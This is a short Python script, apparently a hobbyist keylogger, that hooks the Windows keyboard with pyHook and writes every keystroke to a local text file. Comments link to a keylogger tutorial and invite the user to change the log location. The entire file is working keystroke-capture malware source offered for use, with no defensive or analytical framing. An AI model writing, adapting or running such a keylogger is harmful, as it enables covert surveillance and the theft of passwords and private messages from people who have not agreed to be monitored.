#!/usr/bin/env /bin/python

# https://www.techworm.net/2017/10/create-keylogger-using-notepad.html
# http://www.actualkeylogger.com/
# https://en.wikipedia.org/wiki/Keystroke_logging

import pyHook, pythoncom, sys, logging

# feel free to set the file_log to a different file name/location
file_log = 'keyloggeroutput.txt'

def OnKeyboardEvent(event):

  logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
  
  chr(event.Ascii)
  
  logging.log(10,chr(event.Ascii))
  
  return True

hooks_manager = pyHook.HookManager()

hooks_manager.KeyDown = OnKeyboardEvent

hooks_manager.HookKeyboard()

pythoncom.PumpMessages()

